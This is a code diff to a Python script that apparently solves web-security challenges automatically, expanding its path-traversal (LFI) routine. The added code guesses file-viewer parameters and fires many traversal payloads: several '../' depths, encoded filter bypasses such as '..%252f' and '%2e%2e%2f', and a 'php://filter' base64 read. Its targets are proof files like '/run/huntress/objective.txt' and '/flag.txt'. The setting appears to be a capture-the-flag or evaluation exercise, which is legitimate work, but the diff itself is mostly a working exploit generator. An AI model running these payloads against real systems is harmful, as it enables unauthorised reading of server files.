@@ -275,28 +275,52 @@ def solve_idor(base):
     return best
 
 
-def lfi(base, home, text):
-    """Path traversal: a file-ish query parameter on the page (?doc=about.php) -> read the absolute path the prompt names."""
-    html = home.decode("utf-8", "replace")
-    paths = re.findall(r"(/(?:run|etc|var|opt|srv|tmp|home|app|flag|proc|root)[\w./-]*\.?\w+)", text) or ["/flag.txt"]
+# Where this event mounts the attempt proof: every LFI prompt so far named /run/huntress/objective.txt, but a COMPOUNDED
+# Mastery target (D27/D28 Target 4: this viewer inside another challenge's Mastery) carries the OTHER challenge's prompt,
+# which names no path -- so the default list always holds it (D28 post-mortem #7; it was ["/flag.txt"] only).
+LFI_DEFAULT_PATHS = ("/run/huntress/objective.txt", "/flag.txt")
+# deepest first: include() clamps extra `../` at `/` (D28: base /var/www/html/pages/ took >= 4; read at 6 and 9)
+LFI_DEPTHS = (9, 10, 5, 6, 7, 8, 4, 3, 2, 1)
+LFI_PARAMS = ("doc", "document", "file", "filename", "page", "path", "name", "view", "template", "tpl", "include",
+              "inc", "load", "read", "show", "content")
+
+
+def lfi_params(base, html):
+    """[(action_url, param, value)] the viewer takes a file through, one per (page, param): a link whose query value is
+    file-ish (`?doc=start.php`) or whose name is a file-ish parameter, and every GET form input."""
     params = []
     for href in re.findall(r"(?:href|src|action)=['\"]([^'\"#]*\?[^'\"#]+)['\"]", html):
         href = href.replace("&amp;", "&")
         u = urllib.parse.urlsplit(href)
         for k, v in urllib.parse.parse_qsl(u.query, keep_blank_values=True):
-            if "." in v or "/" in v:
+            if "." in v or "/" in v or k.lower() in LFI_PARAMS:
                 params.append((urllib.parse.urljoin(base, u.path or "/"), k, v))
     for action, method, name in forms(base, html):
         params.append((action, name, ""))
-    params = list(dict.fromkeys(params))
+    seen, out = set(), []
+    for action, k, v in params:
+        if (action, k) not in seen:
+            seen.add((action, k))
+            out.append((action, k, v))
+    return out
+
+
+def lfi(base, home, text):
+    """Path traversal: a file-ish query parameter on the page (?doc=about.php) -> read the absolute path the prompt
+    names, else /run/huntress/objective.txt, at every traversal depth and through the common filter bypasses."""
+    html = home.decode("utf-8", "replace")
+    named = re.findall(r"(/(?:run|etc|var|opt|srv|tmp|home|app|flag|proc|root)[\w./-]*\.?\w+)", text)
+    paths = list(dict.fromkeys(named + list(LFI_DEFAULT_PATHS)))
+    params = lfi_params(base, html)
     for target in paths:
         rel = target.lstrip("/")
-        pls = ["../" * 10 + rel, target, "....//" * 10 + rel, "..%2f" * 10 + rel,
-               "php://filter/convert.base64-encode/resource=" + target]
+        pls = ["../" * d + rel for d in LFI_DEPTHS] + [target]
+        pls += [enc * d + rel for d in (9, 5) for enc in ("....//", "..%2f", "%2e%2e%2f", "..%252f", "..%5c")]
+        pls.append("php://filter/convert.base64-encode/resource=" + target)
         for action, k, v in params:
             prefix = v.rsplit("/", 1)[0] + "/" if "/" in v else ""
             for pl in pls + ([prefix + "../" * 10 + rel] if prefix else []):
-                q = pl if "%2f" in pl else urllib.parse.quote(pl, safe="/:")
+                q = pl if "%" in pl else urllib.parse.quote(pl, safe="/:")
                 body = fetch(action + ("&" if "?" in action else "?") + urllib.parse.quote(k) + "=" + q)
                 v2 = find_proof(body)
                 if v2:
@@ -327,7 +351,10 @@ def answer(answer_id, question, data, contract):
     lt = text.lower()
     fns = {"lfi": lambda: lfi(base, home, text), "sqli": lambda: sqli(base, home),
            "exposed": lambda: exposed(base, home), "idor": lambda: solve_idor(base)}
-    if re.search(r"director|viewer|boundary|mounted|path|travers|include|/run/|/etc/", lt):
+    if re.search(r"director|viewer|boundary|mounted|path|travers|include|/run/|/etc/", lt) \
+            or any("." in v or "/" in v for _a, _k, v in lfi_params(base, home.decode("utf-8", "replace"))):
+        # the page itself is a file viewer (`?doc=start.php` links): a compounded Mastery target's prompt is another
+        # challenge's and names neither the class nor the path (D27/D28 Target 4)
         order = ["lfi", "exposed", "idor", "sqli"]
     elif re.search(r"permission|someone else|other user|another user|owner|slip", lt):
         order = ["idor", "exposed", "lfi", "sqli"]
